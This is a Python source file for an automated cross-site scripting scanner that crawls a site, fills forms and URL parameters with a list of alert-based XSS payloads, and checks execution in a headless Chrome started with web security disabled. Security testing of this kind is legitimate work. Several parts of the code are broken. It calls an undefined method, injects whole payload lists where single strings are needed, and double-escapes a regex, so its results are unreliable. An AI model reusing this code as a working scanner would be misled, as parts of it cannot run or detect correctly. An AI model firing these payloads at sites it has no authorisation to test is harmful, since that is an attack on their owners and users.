import requests
from bs4 import BeautifulSoup, Comment
from urllib.parse import urlparse, urljoin, parse_qs
from selenium import webdriver
from selenium.common import TimeoutException, NoAlertPresentException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from concurrent.futures import ThreadPoolExecutor
import json
import hashlib
import re
import threading
import time
import logging


class AdvancedXSSScanner:
    def __init__(self, target_url, headless=True):
        self.target_url = target_url
        self.base_url = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
        self.session = requests.Session()
        self.vulnerabilities = []
        self.checked_forms = set()
        self.checked_urls = set()
        self.lock = threading.Lock()
        self.csrf_tokens = {}  # Nouveau: Stockage des tokens CSRF

        # Configuration
        self.scan_depth = 2
        self.timeout = 10
        self.max_threads = 5
        self.rate_limit = 1.0  # Seconds between requests

        # Enhanced payload list with context-specific vectors
        self.payloads = self.load_payloads()

        # Selenium WebDriver
        self.driver = self.init_selenium(headless)

        # Logger
        logging.basicConfig(level=logging.INFO)

        # Add a User-Agent for requests to mimic a real browser
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
        })

    def init_selenium(self, headless):
        options = webdriver.ChromeOptions()
        if headless:
            options.add_argument("--headless=new")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-web-security")
        options.add_argument("--allow-running-insecure-content")
        return webdriver.Chrome(options=options)

    def load_payloads(self):
        return {
            "html": [
                '<svg/onload=alert("XSS")>',
                '<img src=x onerror=alert(document.domain)>',
                '<details open ontoggle=alert(1)>'
            ],
            "attribute": [
                '" autofocus onfocus=alert(1)',
                'javascript:alert(1)//',
                ' onmouseover=alert(1)'
            ],
            "script": [
                '</script><script>alert(1)</script>',
                '${alert(1)}',
                ';alert(1)'
            ],
            "polyglot": [
                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(alert(1))//%0D%0A//</stYle/</scRipt/</teXtarEa>'
            ],
            "event_handlers": [
                'onload=alert("XSS")',
                'onmouseover=alert(1)',
                'onerror=alert(document.cookie)'
            ],
            "svg": [
                '<svg><script>alert(1)</script>',
                '<svg onload=alert(document.domain)>'
            ]
        }

    def scan(self):
        try:
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                executor.submit(self.crawl_and_spider)
        finally:
            self.driver.quit()
            self.generate_report()

    def crawl_and_spider(self):
        queue = [(self.target_url, 0)]
        while queue:
            url, depth = queue.pop(0)
            if depth > self.scan_depth or url in self.checked_urls:
                continue

            self.checked_urls.add(url)

            try:
                response = self.session.get(url, timeout=self.timeout)
                soup = BeautifulSoup(response.content, "html.parser")

                self.test_dynamic_analysis(url)
                self.test_url_parameters(url)

                # Test forms
                for form in soup.find_all("form"):
                    form_hash = hashlib.md5(str(form).encode()).hexdigest()
                    if form_hash not in self.checked_forms:
                        self.checked_forms.add(form_hash)
                        self.test_form(form, url)

                # Find links
                for link in soup.find_all("a", href=True):
                    absolute_url = urljoin(self.base_url, link["href"])
                    if absolute_url not in self.checked_urls:
                        queue.append((absolute_url, depth + 1))

            except Exception as e:
                logging.error(f"Error while processing {url}: {str(e)}\n")

    def cleanup_alerts(self):
        try:
            Alert(self.driver).dismiss()
        except:
            pass

    def test_dynamic_analysis(self, url):
        try:
            for payload in self.payloads.values():
                self.driver.get(url)
                self.cleanup_alerts()  # Nettoyage préalable

                script = f"try {{ document.body.innerHTML += {json.dumps(payload)}; }} catch(e) {{}}"
                self.driver.execute_script(script)

                # Attente conditionnelle de l'alerte
                try:
                    WebDriverWait(self.driver, 1).until(EC.alert_is_present())
                    Alert(self.driver).accept()
                    self.log_vulnerability("DOM_XSS", payload, url)
                except (TimeoutException, NoAlertPresentException):
                    continue

                time.sleep(0.5)
        except Exception as e:
            logging.error(f"Erreur d'analyse dynamique: {str(e)}")

    def test_url_parameters(self, url):
        # Validation de l'entrée
        if not isinstance(url, str) or not url.strip():
            raise ValueError("L'URL fournie est invalide ou vide.")

        try:
            # Extraction des paramètres de l'URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            # Analyse des paramètres
            for param, values in params.items():
                if not values:  # Ignorer les paramètres sans valeur
                    continue

                for value in values:
                    self.test_parameter(url, f"{param}={value}", "GET")
        except Exception as e:
            # Gestion des exceptions et journalisation
            print(f"Erreur lors de l'analyse des paramètres pour l'URL {url}: {e}\n")

    def test_form(self, form, url):
        action = urljoin(url, form.get("action", ""))
        method = form.get("method", "get").lower()
        inputs = form.find_all(["input", "textarea", "select"])
        
        # Récupération des tokens CSRF
        form_data = {}
        for inp in inputs:
            name = inp.get("name")
            if name and "csrf" in name.lower():
                self.csrf_tokens[name] = inp.get("value", "")
        
        # Injection des payloads dans tous les champs
        for payload_type in ["html", "attribute", "script"]:
            for payload in self.payloads[payload_type]:
                data = {
                    inp.get("name"): payload for inp in inputs if inp.get("name")
                }
                data.update(self.csrf_tokens)  # Injection des tokens CSRF
                self.send_request(action, method, data, payload)

    def send_request(self, url, method, data, payload=None):
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            if method == "post":
                response = self.session.post(url, data=data, headers=headers)
            else:
                response = self.session.get(url, params=data, headers=headers)

            if payload:
                self.analyze_response(response, payload)
                
                # Vérification de l'exécution dans Selenium
                try:
                    self.driver.get(response.url)
                    if payload in self.driver.page_source:
                        if self.check_payload_execution():
                            self.log_vulnerability("EXECUTED", payload, response.url)
                except Exception as e:
                    logging.error(f"Execution check failed: {str(e)}\n")
                    
        except Exception as e:
            logging.error(f"Error sending request to {url}: {str(e)}\n")

    def check_payload_execution(self):
        try:
            WebDriverWait(self.driver, 2).until(EC.alert_is_present())
            Alert(self.driver).accept()
            return True
        except:
            return False

    def analyze_response(self, response, payload):
        # Vérification avancée des contextes
        contexts = {
            "unencoded_html": re.search(re.escape(re.escape(payload)), response.text),
            "javascript_context": re.search(rf'(?i)(=\s*[\'"]?|{{)({re.escape(payload)})', response.text),
            "attribute_context": re.search(rf'(?i)<\w+[^>]+\b\w+=([\'"])(.*?{re.escape(payload)}.*?)\1', response.text)
        }
        
        if any(contexts.values()):
            self.log_vulnerability("REFLECTED", payload, response.url)

    def log_vulnerability(self, context, payload, url=None):
        with self.lock:
            vuln = {
                "url": url or self.driver.current_url,
                "payload": payload,
                "context": context,
                "severity": "High" if context == "EXECUTED" else "Medium"
            }
            self.vulnerabilities.append(vuln)

    def generate_report(self):
        report = {
            "target": self.target_url,
            "scan_date": time.ctime(),
            "vulnerabilities": self.vulnerabilities,
            "stats": {
                "pages_crawled": len(self.checked_urls),
                "forms_tested": len(self.checked_forms),
            }
        }

        with open("xss_report.json", "w") as f:
            json.dump(report, f, indent=2)

        logging.info(f"Report generated with {len(self.vulnerabilities)} vulnerabilities.")

if __name__ == "__main__":
    target_url = "http://localhost:3000/index.html"
    scanner = AdvancedXSSScanner(target_url)
    scanner.scan()